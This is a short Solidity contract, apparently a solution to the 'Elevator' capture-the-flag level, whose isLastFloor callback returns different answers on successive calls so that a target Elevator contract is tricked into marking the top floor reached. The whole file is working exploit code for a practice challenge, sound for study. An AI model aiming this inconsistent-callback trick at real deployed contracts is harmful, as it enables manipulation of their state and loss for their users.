pragma solidity ^0.5.0;

import "./Elevator.sol";

contract HackElevator {
    bool public flag;
    
    function isLastFloor(uint) external returns (bool) {
        flag = !flag;
        return !flag;
    }
    
    function hack(address elevatorAddr) public {
        Elevator(elevatorAddr).goTo(1);
    }
}